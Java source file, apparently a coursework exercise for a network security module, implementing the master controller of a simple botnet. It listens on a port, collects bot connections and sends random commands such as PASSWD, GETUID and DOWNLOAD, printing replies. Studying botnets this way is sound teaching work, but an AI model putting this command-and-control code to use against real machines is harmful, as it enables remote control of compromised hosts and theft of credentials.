/*
AUTHOR: Daniel Hedemalm
Module: Network Security & Cryptography CSN09112
*/

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Controller {
  // Port that will be opened
  int port = 8888;
  int millisecondsTimeout = 50;
  // List that will fill upp with connected clients
  static List<Socket> sockets = new ArrayList<Socket>();

  ServerSocket servSock;

  public static void main(String[] args) throws IOException, InterruptedException {
    System.out.println("-------------------------------");
    System.out.println("| Flowless' Botnet --- Master |");
    System.out.println("|         Version 1.0         |");
    System.out.println("-------------------------------");
    // Instantiate the server
    Controller serv = new Controller();
    // Open the given port
    serv.Open();
    String reply;
    // Wait for incoming connections
    while (true)
    {
      // Constantly looks for new connections
      serv.AcceptClients();
      if (sockets.size() > 0) {
        // Get the first client in sockets, to know which client to send the message to
        Socket sock = sockets.get(0);
        sendCommand(sock);
        receiveReply(sock);
        // Sleep to avoid spam
        int sleepTime = 1000; //milliseconds
        Thread.sleep(sleepTime);
      }

    }
  }

  static void sendCommand(Socket sock) throws IOException {
    //Randomize a integer which will choose [i] of command array
    Random rand = new Random();
    int choice = rand.nextInt(4);
    //System.out.println(choice);
    //The chosen command will be sent to away
    String[] commands = {"VERSION", "PASSWD", "GETUID", "DOWNLOAD"};
    // Determine command to be sent
    System.out.println("Sending: " + commands[choice]);
    //Initialize PrintWriter to start output stream
    PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
    // Sent and flush toilet
    out.println(commands[choice]);
    out.flush();
  }

  static void receiveReply(Socket sock) throws IOException {  //Read what is received and print out to console
    boolean incData = false;
    //Initialize a BufferedReader
    BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
    // Read in the line
    if (!in.ready()) {
      return;
    }
    // Reads commands from Controller
    String command = in.readLine();
    if (command.length() >= 1) { // If reply, print it out
      System.out.println("Reply: "+ command);
    }
  }

  void Open() throws IOException {
    servSock = new ServerSocket(port);
    servSock.setSoTimeout(millisecondsTimeout);
    System.out.println("Launching Controller on port: "+port);
  }

  void AcceptClients() throws IOException {

    do {
        // check dead connections, if any, kill
        if (sockets.size() > 0) {
          for (int i = 0; i < sockets.size(); ++i)
          {
              Socket sock = sockets.get(i);
              if (sock.isClosed() || !sock.isConnected())
              {
                  sockets.remove(sock);
                  System.out.println("Client disconnected.");
              }
          }
        }
        try {
            Socket socket = servSock.accept();
            sockets.add(socket);
        }
        catch (java.io.InterruptedIOException ioe)
        {
            break; // No new client, just break the loop.
        }
        System.out.println("Incoming client.");
        System.out.println("Clients: "+sockets.size());
      } while (true);
  }

}
